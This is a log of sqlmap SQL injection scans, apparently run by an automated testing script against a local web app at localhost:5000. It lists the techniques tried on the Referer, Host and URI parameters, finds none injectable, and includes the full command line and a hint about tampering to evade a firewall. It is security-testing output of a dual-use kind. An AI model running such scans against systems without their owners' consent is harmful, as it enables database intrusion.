2025-09-26 18:54:33,538 - INFO - [18:54:33] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
2025-09-26 18:54:33,550 - INFO - [18:54:33] [INFO] testing for SQL injection on parameter 'Referer'
2025-09-26 18:54:33,627 - INFO - [18:54:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:54:34,024 - INFO - [18:54:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:54:34,609 - INFO - [18:54:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:54:34,984 - INFO - [18:54:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:54:35,312 - INFO - [18:54:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:54:35,768 - INFO - [18:54:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:54:35,863 - INFO - [18:54:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:54:35,997 - INFO - [18:54:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:54:36,074 - INFO - [18:54:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:54:36,246 - INFO - [18:54:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:54:36,501 - INFO - [18:54:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:54:36,652 - INFO - [18:54:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:54:36,884 - INFO - [18:54:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:54:37,251 - INFO - [18:54:37] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:54:37,600 - INFO - [18:54:37] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:54:37,983 - INFO - [18:54:37] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:54:38,518 - INFO - [18:54:38] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:54:38,856 - INFO - [18:54:38] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:54:39,474 - INFO - [18:54:39] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:54:39,774 - INFO - [18:54:39] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:54:40,341 - INFO - [18:54:40] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:54:40,722 - INFO - [18:54:40] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:54:41,325 - INFO - [18:54:41] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:54:41,597 - INFO - [18:54:41] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:54:42,081 - INFO - [18:54:42] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:54:42,403 - INFO - [18:54:42] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:54:42,940 - INFO - [18:54:42] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:42,940 - INFO - [18:54:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:54:42,962 - INFO - [18:54:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:54:42,969 - INFO - [18:54:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:54:42,981 - INFO - [18:54:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:54:42,989 - INFO - [18:54:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:54:43,006 - INFO - [18:54:43] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:54:43,017 - INFO - [18:54:43] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:54:43,027 - INFO - [18:54:43] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:43,027 - INFO - [18:54:43] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:54:43,047 - INFO - [18:54:43] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:54:43,057 - INFO - [18:54:43] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:54:43,070 - INFO - [18:54:43] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:43,080 - INFO - [18:54:43] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:54:43,086 - INFO - [18:54:43] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:43,096 - INFO - [18:54:43] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:54:43,101 - INFO - [18:54:43] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:43,113 - INFO - [18:54:43] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 18:54:43,123 - INFO - [18:54:43] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:43,123 - INFO - [18:54:43] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:54:43,141 - INFO - [18:54:43] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:54:43,151 - INFO - [18:54:43] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:54:43,156 - INFO - [18:54:43] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:54:43,166 - INFO - [18:54:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:43,184 - INFO - [18:54:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:43,206 - INFO - [18:54:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:43,206 - INFO - [18:54:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:43,206 - INFO - [18:54:43] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:43,225 - INFO - [18:54:43] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:54:43,245 - INFO - [18:54:43] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:54:43,261 - INFO - [18:54:43] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:54:43,279 - INFO - [18:54:43] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:54:43,293 - INFO - [18:54:43] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:43,320 - INFO - [18:54:43] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:43,336 - INFO - [18:54:43] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:43,355 - INFO - [18:54:43] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:43,375 - INFO - [18:54:43] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:43,390 - INFO - [18:54:43] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:43,410 - INFO - [18:54:43] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:54:43,433 - INFO - [18:54:43] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:54:43,453 - INFO - [18:54:43] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:54:43,737 - INFO - [18:54:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:54:43,937 - INFO - [18:54:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:54:43,947 - INFO - [18:54:43] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:54:44,197 - INFO - [18:54:44] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:54:44,435 - INFO - [18:54:44] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:54:44,680 - INFO - [18:54:44] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:54:44,919 - INFO - [18:54:44] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:54:45,147 - INFO - [18:54:45] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:54:45,349 - INFO - [18:54:45] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 18:54:45,567 - INFO - [18:54:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:54:46,097 - INFO - [18:54:46] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 18:54:46,773 - INFO - [18:54:46] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:54:47,433 - INFO - [18:54:47] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 18:54:47,931 - INFO - [18:54:47] [WARNING] parameter 'Referer' does not seem to be injectable
2025-09-26 18:54:47,931 - INFO - [18:54:47] [INFO] testing if parameter 'Host' is dynamic
2025-09-26 18:54:47,942 - INFO - [18:54:47] [WARNING] parameter 'Host' does not appear to be dynamic
2025-09-26 18:54:47,942 - INFO - [18:54:47] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
2025-09-26 18:54:47,980 - INFO - [18:54:47] [INFO] testing for SQL injection on parameter 'Host'
2025-09-26 18:54:48,026 - INFO - [18:54:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:54:48,537 - INFO - [18:54:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:54:49,155 - INFO - [18:54:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:54:49,625 - INFO - [18:54:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:54:49,908 - INFO - [18:54:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:54:50,264 - INFO - [18:54:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:54:50,358 - INFO - [18:54:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:54:50,510 - INFO - [18:54:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:54:50,586 - INFO - [18:54:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:54:50,747 - INFO - [18:54:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:54:51,132 - INFO - [18:54:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:54:51,293 - INFO - [18:54:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:54:51,501 - INFO - [18:54:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:54:51,993 - INFO - [18:54:51] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:54:52,366 - INFO - [18:54:52] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:54:52,711 - INFO - [18:54:52] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:54:53,256 - INFO - [18:54:53] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:54:53,654 - INFO - [18:54:53] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:54:54,906 - INFO - [18:54:54] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:54:55,275 - INFO - [18:54:55] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:54:55,925 - INFO - [18:54:55] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:54:56,268 - INFO - [18:54:56] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:54:56,866 - INFO - [18:54:56] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:54:57,179 - INFO - [18:54:57] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:54:57,814 - INFO - [18:54:57] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:54:58,192 - INFO - [18:54:58] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:54:58,966 - INFO - [18:54:58] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:58,981 - INFO - [18:54:58] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:54:58,998 - INFO - [18:54:58] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:54:59,008 - INFO - [18:54:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:54:59,026 - INFO - [18:54:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:54:59,049 - INFO - [18:54:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:54:59,061 - INFO - [18:54:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:54:59,074 - INFO - [18:54:59] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:54:59,095 - INFO - [18:54:59] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:59,110 - INFO - [18:54:59] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:54:59,121 - INFO - [18:54:59] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:54:59,135 - INFO - [18:54:59] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:54:59,154 - INFO - [18:54:59] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:59,174 - INFO - [18:54:59] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:54:59,184 - INFO - [18:54:59] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:59,202 - INFO - [18:54:59] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:54:59,210 - INFO - [18:54:59] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:59,223 - INFO - [18:54:59] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 18:54:59,246 - INFO - [18:54:59] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:59,258 - INFO - [18:54:59] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:54:59,277 - INFO - [18:54:59] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:54:59,304 - INFO - [18:54:59] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:54:59,322 - INFO - [18:54:59] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:54:59,332 - INFO - [18:54:59] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:59,360 - INFO - [18:54:59] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:59,383 - INFO - [18:54:59] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:59,387 - INFO - [18:54:59] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:59,391 - INFO - [18:54:59] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:59,415 - INFO - [18:54:59] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:54:59,440 - INFO - [18:54:59] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:54:59,465 - INFO - [18:54:59] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:54:59,491 - INFO - [18:54:59] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:54:59,513 - INFO - [18:54:59] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:59,540 - INFO - [18:54:59] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:59,571 - INFO - [18:54:59] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:59,598 - INFO - [18:54:59] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:59,623 - INFO - [18:54:59] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:59,646 - INFO - [18:54:59] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:59,671 - INFO - [18:54:59] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:54:59,696 - INFO - [18:54:59] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:54:59,725 - INFO - [18:54:59] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:55:00,091 - INFO - [18:55:00] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:55:00,416 - INFO - [18:55:00] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:55:00,446 - INFO - [18:55:00] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:55:00,796 - INFO - [18:55:00] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:55:01,049 - INFO - [18:55:01] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:55:01,268 - INFO - [18:55:01] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:55:01,535 - INFO - [18:55:01] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:55:01,768 - INFO - [18:55:01] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:55:01,969 - INFO - [18:55:01] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 18:55:02,199 - INFO - [18:55:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:55:02,828 - INFO - [18:55:02] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 18:55:03,465 - INFO - [18:55:03] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:55:04,062 - INFO - [18:55:04] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 18:55:04,568 - INFO - [18:55:04] [WARNING] parameter 'Host' does not seem to be injectable
2025-09-26 18:55:04,568 - INFO - [18:55:04] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 18:55:04,568 - INFO - [18:55:04] [WARNING] HTTP error codes detected during run:
2025-09-26 18:55:04,579 - INFO - 405 (Method Not Allowed) - 5160 times, 404 (Not Found) - 2360 times
2025-09-26 18:55:04,579 - INFO - 
2025-09-26 18:55:04,579 - INFO - [*] ending @ 18:55:04 /2025-09-26/
2025-09-26 18:55:04,579 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/xxe --output-dir 'attack-logs-dynamic\XXE_Injection_sqlmap' --batch --level=5 --risk=3 --threads 5 --technique BU
--------------------------------------------------
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.9.4#dev}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:53:49 /2025-09-26/

[18:53:51] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\XXE_Injection_sqlmap' as the output directory
[18:53:52] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[18:53:52] [INFO] testing connection to the target URL
[18:53:52] [WARNING] the web server responded with an HTTP error code (405) which could interfere with the results of the tests
[18:53:52] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:53:52] [INFO] testing if the target URL content is stable
[18:53:52] [INFO] target URL content is stable
[18:53:52] [INFO] testing if URI parameter '#1*' is dynamic
[18:53:52] [INFO] URI parameter '#1*' appears to be dynamic
[18:53:52] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[18:53:52] [INFO] testing for SQL injection on URI parameter '#1*'
[18:53:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:53:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:53:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:53:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:53:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:53:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:53:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:53:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:53:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:53:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:53:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:53:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:53:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:53:59] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:54:00] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:54:01] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:54:01] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:54:02] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:54:03] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:54:04] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:54:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:54:06] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:54:06] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:54:07] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:54:08] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:54:08] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:54:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:54:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:54:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:54:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:54:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:54:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:54:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:54:09] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:54:09] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:54:09] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:54:09] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:54:09] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:54:09] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:54:09] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:54:09] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:54:09] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:54:09] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:54:09] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:54:09] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:54:10] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:54:10] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:54:10] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:54:10] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:54:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:10] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:10] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
